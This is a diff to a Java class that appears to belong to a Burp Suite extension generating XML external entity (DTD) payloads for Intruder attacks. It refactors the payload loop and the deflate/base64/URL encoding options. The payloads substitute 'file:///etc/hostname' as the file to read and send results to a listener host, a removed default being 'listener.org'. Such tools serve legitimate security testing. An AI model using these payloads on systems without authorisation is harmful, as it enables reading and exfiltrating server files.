@@ -65,13 +65,9 @@ public class DTDPayloadFactory implements IIntruderPayloadGeneratorFactory {
         private final String targetFILE = "§tf_targetFILE§";
 
         private InputJDialog dialog;
-        private String listener = "listener.org";
-        private String protocol = "http";
-
         private IIntruderAttack attack;
         private ArrayList<String> rawDtds;
         private ArrayList<String> dtds;
-
         private int payloadIndex;
 
         public DTDPayloadGenerator(IIntruderAttack attack) {
@@ -127,8 +123,9 @@ public class DTDPayloadFactory implements IIntruderPayloadGeneratorFactory {
             ArrayList<String> listeners = dialog.getListeners();
             ArrayList<String> protocols = dialog.getProtocols();
             int listenerIndex = 0;
-            for (String vector : rawDtds) {
+            for (int i = 0; i < rawDtds.size(); i++) {
                 for (String protocol : protocols) {
+                    String vector = rawDtds.get(i);
                     // TODO: do not use targetFiles, perhaps add specific config 
                     vector = vector.replace(targetFILE, "file:///etc/hostname");
                     vector = vector.replace(helperURL, protocol + listeners.get(listenerIndex));
@@ -142,20 +139,19 @@ public class DTDPayloadFactory implements IIntruderPayloadGeneratorFactory {
 
         private String encode(String vector) {
             byte[] tmp = vector.getBytes();
-            if (dialog.getCompressionChoice()) {
+            if (dialog.getEnflateChoice()) {
                 try {
                     tmp = Compression.compress(tmp);
-                    tmp = helpers.base64Encode(tmp).getBytes();
-                    tmp = helpers.urlEncode(tmp);
                 } catch (IOException ex) {
-                    tmp = vector.getBytes();
-                    Logging.getInstance().log(getClass(), "failed to re-encode SAML param", Logging.ERROR);
+                    Logging.getInstance().log(getClass(), "failed to compress param", Logging.ERROR);
                 }
-            } else {
+            }
+            if (dialog.getBase64Choice()) {
                 tmp = helpers.base64Encode(tmp).getBytes();
+            }
+            if (dialog.getUrlChoice()) {
                 tmp = helpers.urlEncode(tmp);
             }
-
             return new String(tmp);
         }
     }
